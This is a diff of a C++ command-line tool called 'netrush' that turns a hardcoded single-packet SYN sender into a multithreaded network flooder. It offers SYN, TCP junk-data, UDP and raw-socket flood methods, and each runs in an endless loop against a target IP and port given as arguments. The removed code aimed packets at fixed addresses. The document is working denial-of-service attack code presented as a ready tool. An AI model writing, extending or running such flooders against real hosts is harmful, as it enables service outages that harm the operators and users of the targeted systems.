@@ -8,157 +8,176 @@
 #include <unistd.h>
 #include <csignal>
 #include <cstring>
+#include <fcntl.h>
 
 #include "argparse.hpp"
 
-#define PACKET_LEN  sizeof(struct iphdr) + sizeof(struct tcphdr)
-
 std::string dest_ip;
-std::string junk = "x";
+std::string method;
+
 unsigned int dest_port;
-unsigned int junk_length;
+unsigned int junk_length = 5;
 unsigned int thread_count = 1;
 
+std::map<std::string, void(*)()> method_map;
 argparse::ArgumentParser aparser("netrush", "1.0");
 sockaddr_in dest;
 timeval timeout;
 std::vector<std::thread> threads;
 
-// Function to calculate checksum
-unsigned short checksum(void *b, int len) {    
-    unsigned short *buf = (unsigned short *)b; 
-    unsigned int sum = 0; 
-    unsigned short result; 
+std::string alphanum = "0123456789"
+        "ABCDEFGHIJKLMNOPQRSTUVWXYZ"
+        "abcdefghijklmnopqrstuvwxyz";
+int alphanum_size = alphanum.length();
 
-    for (sum = 0; len > 1; len -= 2) 
-        sum += *buf++; 
-    if (len == 1) 
-        sum += *(unsigned char *)buf; 
+// helpers
 
-    sum = (sum >> 16) + (sum & 0xFFFF); 
-    sum += (sum >> 16); 
-    result = ~sum; 
-
-    return result; 
+std::string rand_str(int length)
+{
+    std::string result;
+    for (int i = 0; i < length; i++) result += alphanum[rand() % (alphanum_size - 1)];
+    return result;
 }
+
+/* ------------------------- flood methods ------------------------- */
+
+// ------- //
 
 // do not require special privileges
 void syn_flood()
 {
+    timeout.tv_sec = 0;
+    timeout.tv_usec = 1;
+
     while (true)
     {
         int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
-        if (sockfd < 0) std::cout << "Socket creation error. Errno: " << errno;
+        if (sockfd < 0) std::cerr << "\nSocket creation error. Errno: " << errno;
         setsockopt(sockfd, SOL_SOCKET, SO_SNDTIMEO, &timeout, sizeof(timeout));
         int connection_status = connect(sockfd, (sockaddr*) &dest, sizeof(dest));
         close(sockfd);
     }
 }
 
-void raw_tcp_flood()
+// ------- //
+
+void tcp_flood()
 {
-    int sockfd;
-    char packet[PACKET_LEN];
-    struct sockaddr_in dest;
-    struct iphdr *ip = (struct iphdr *)packet;
-    struct tcphdr *tcp = (struct tcphdr *)(packet + sizeof(struct iphdr));
+    while (true)
+    {
+        int sockfd = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
+        int connection_status = connect(sockfd, (sockaddr*) &dest, sizeof(dest));
 
-    // Create raw socket
-    sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
+        int noDelay = 1;
+        setsockopt(sockfd, IPPROTO_TCP, TCP_NODELAY, &noDelay, sizeof(noDelay));
+
+        if (connection_status == 0)
+        {
+            while (true)
+            {
+                std::string junk = rand_str(junk_length);
+                send(sockfd, junk.c_str(), junk.length(), 0);
+            }
+        }
+        else 
+        {
+            close(sockfd);
+            std::cerr << "Connection error. Errno: " << errno;
+            exit(1);
+        }
+    }
+}
+
+// ------- //
+
+void udp_flood()
+{
+    int sockfd = socket(AF_INET, SOCK_DGRAM, 0);
     if (sockfd < 0) {
-        perror("socket creation failed");
-        exit(1);
-    }
-    
-    // IP header
-    ip->ihl = 5;
-    ip->version = 4;
-    ip->tos = 0;
-    ip->tot_len = htons(PACKET_LEN);
-    ip->id = htonl(54321);
-    ip->frag_off = 0;
-    ip->ttl = 255;
-    ip->protocol = IPPROTO_TCP;
-    ip->check = 0; // Set to 0 before calculating checksum
-    ip->saddr = inet_addr("192.168.42.226"); // Source IP address
-    ip->daddr = inet_addr("168.119.255.140"); // Destination IP address
-    
-    // TCP header
-    tcp->source = htons(12345); // Source port
-    tcp->dest = htons(22); // Destination port
-    tcp->seq = htonl(0);
-    tcp->ack_seq = 0;
-    tcp->doff = 5;
-    tcp->fin = 0;
-    tcp->syn = 1; // SYN flag
-    tcp->rst = 0;
-    tcp->psh = 0;
-    tcp->ack = 0;
-    tcp->urg = 0;
-    tcp->window = htons(5840); // Maximum window size
-    tcp->check = 0; // Set to 0 before calculating checksum
-    tcp->urg_ptr = 0;
-
-    // IP checksum
-    ip->check = checksum((unsigned short *)packet, ip->tot_len);
-
-    // TCP pseudo-header for checksum calculation
-    unsigned short tcp_len = sizeof(struct tcphdr);
-    unsigned short total_len = tcp_len + sizeof(struct iphdr);
-    char pseudo_packet[total_len];
-    memcpy(pseudo_packet, packet, sizeof(struct iphdr));
-    memcpy(pseudo_packet + sizeof(struct iphdr), tcp, sizeof(struct tcphdr));
-    tcp->check = checksum((unsigned short *)pseudo_packet, total_len);
-
-    // Destination address
-    dest.sin_family = AF_INET;
-    dest.sin_addr.s_addr = ip->daddr;
-
-    // Send the packet
-    if (sendto(sockfd, packet, PACKET_LEN, 0, (struct sockaddr *)&dest, sizeof(dest)) < 0) {
-        perror("sendto failed");
-        close(sockfd);
+        std::cerr << "Socket creation error. Errno: " << errno << "\n";
         exit(1);
     }
 
-    std::cout << "SYN packet sent successfully." << std::endl;
+    int flags = fcntl(sockfd, F_GETFL, 0);
+    fcntl(sockfd, F_SETFL, flags | O_NONBLOCK);
 
+    while (true)
+    {
+        std::string junk = rand_str(junk_length);
+        int sent_bytes = sendto(sockfd, junk.c_str(), junk.length(), 0, (const struct sockaddr *) &dest, sizeof(dest));
+    }
+    
     close(sockfd);
 }
 
+// ------- //
+
+// root required
+void raw_tcp_flood()
+{
+    int sockfd = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
+    if (sockfd < 0) {
+        std::cerr << "Socket creation error. Errno: " << errno << "\n";
+        exit(1);
+    }
+
+    while (true)
+    {
+        std::string junk = rand_str(junk_length);
+        int sent_bytes = sendto(sockfd, junk.c_str(), junk.length(), 0, (const struct sockaddr *) &dest, sizeof(dest));
+    }
+    
+    close(sockfd);
+}
+
+/* ----------------------------------------------------------------- */
+
 int main(int argc, char* argv[])
 {
-    raw_tcp_flood();
-    // // required arguments
-    // aparser.add_argument("-I", "--ip").store_into(dest_ip).required().help("target IPv4 address.");
-    // aparser.add_argument("-P", "--port").store_into(dest_port).required().help("target port.");
+    /* startup */
 
-    // // additional arguments
-    // aparser.add_argument("-J", "--junk-length").store_into(junk_length).help("length of the junk data that will be sent while raw_tcp_flood.");
-    // aparser.add_argument("-T", "--threads").store_into(thread_count).help("thread count (default: 1).");
+    // normal methods
+    method_map["utcpsyn"] = syn_flood;
+    method_map["utcpflood"] = tcp_flood;
+    method_map["uudpflood"] = udp_flood;
 
-    // aparser.parse_args(argc, argv);
+    // root-required methods
+    method_map["rtcpflood"] = raw_tcp_flood;
 
-    // std::cout << "Initialization...\n";
+    // required arguments
+    aparser.add_argument("-I", "--ip").store_into(dest_ip).required().help("target IPv4 address.");
+    aparser.add_argument("-P", "--port").store_into(dest_port).required().help("target port.");
+    aparser.add_argument("-M", "--method").store_into(method).required().help("flood method.");
 
-    // /* ------------------------------------ */
+    // additional arguments
+    aparser.add_argument("-J", "--junk-length").store_into(junk_length).help("length of the junk data that will be sent while raw_tcp_flood. (default: 5)");
+    aparser.add_argument("-T", "--threads").store_into(thread_count).help("thread count (default: 1).");
+
+    aparser.parse_args(argc, argv);
+
+    std::cout << "Initialization...\n";
+
+    /* ------------------------------------ */
     
-    // dest.sin_family = AF_INET;
-    // dest.sin_port = htons(dest_port);
-    // inet_pton(AF_INET, dest_ip.c_str(), &dest.sin_addr);
+    dest.sin_family = AF_INET;
+    dest.sin_port = htons(dest_port);
+    inet_pton(AF_INET, dest_ip.c_str(), &dest.sin_addr);
 
-    // timeout.tv_sec = 0;
-    // timeout.tv_usec = 1;
+    if (method_map.find(method) == method_map.end())
+    {
+        std::cerr << "Unknown method. Quitting.\n";
+        return 1;
+    }
 
-    // /* ------------------------------------ */
+    /* ------------------------------------ */
 
-    // std::cout << "Flooding now.\n";
+    std::cout << "Flooding now.\n";
 
-    // /* ------------------------------------ */
+    /* ------------------------------------ */
 
-    // for (int i = 0; i < thread_count; i++) threads.emplace_back(raw_tcp_flood);
-    // for (std::thread &t : threads) t.join();
+    for (int i = 0; i < thread_count; i++) threads.emplace_back(method_map[method]);
+    for (std::thread &t : threads) t.join();
 
-    // /* ------------------------------------ */
+    /* ------------------------------------ */
     return 0;
 }
